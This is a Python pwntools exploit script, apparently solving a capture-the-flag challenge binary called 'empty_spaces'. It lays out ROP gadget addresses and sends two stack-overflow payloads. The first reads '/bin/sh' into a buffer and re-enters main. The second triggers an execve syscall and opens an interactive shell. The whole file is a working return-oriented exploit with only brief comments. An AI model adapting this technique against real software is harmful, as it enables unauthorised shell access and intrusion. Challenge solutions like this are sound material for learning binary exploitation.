from pwn import *

# break in pop_rsi
CHALL_PATH = "./empty_spaces"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b *0x401998
c
"""
context.arch = "amd64"

if args.REMOTE:
    pass
else:
    if args.GDB:
        r = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        r = process(CHALL_PATH)

added_by_empty = 0xc3f48948
addr_read = 0x419630
addr_reenter_main = 0x401922
addr_buffer = 0x4aa310
addr_pop_rsi = 0x477d3d #pop rsi; ret; 
addr_pop_rdi = 0x4787b3 #pop rdi; ret;
addr_pop_rax = 0x42146b #pop rax; ret;
addr_pop_rdx = 0x45db53 #pop rdx; leave; ret;
addr_syscall = 0x401324
addr_ret = 0x44546b
addr_syscallret = 0x40ba76 #syscall; ret;
addr_pop_rbx = 0x471a37 #pop rbx; ret;
addr_xor_edx = 0x455938 #xor edx, edx; call rax; 

addr_xchng = 0x40262d #xchg edx, eax; xor eax, eax; ret; 

binsh = b"/bin/sh\x00"

#payload 1 is used to have a read to put /bin/sh\x00 in an address, the sEIP is set with the start of main since there was no space to perform the exploit with one payload
#the function empty() corrupt the data till the sEBP

payload1 = b"A"*72
payload1 += p64(addr_pop_rsi)
payload1 += p64(addr_buffer)
payload1 += p64(addr_pop_rdi)
payload1 += p64(0)
payload1 += p64(addr_syscallret)
payload1 += p64(addr_reenter_main)

#used for execve of bin/sh

payload2 = b"A"*72
payload2 += p64(addr_xchng)
payload2 += p64(addr_pop_rax)
payload2 += p64(0x3b)
payload2 += p64(addr_pop_rsi)
payload2 += p64(0)
payload2 += p64(addr_pop_rdi)
payload2 += p64(addr_buffer)
payload2 += p64(addr_syscall)

r.recvuntil(b"to pwn?")
r.send(payload1)

#input("wait")
r.send(binsh)

r.recvuntil(b"to pwn?")

#input("wait")
r.send(payload2)



r.interactive()



'''payload1 += p64(addr_pop_rax)
payload1 += p64(0x3b)
payload1 += p64(addr_pop_rsi)
payload1 += p64(0)
payload1 += p64(addr_pop_rdi)
payload1 += p64(addr_buffer)'''
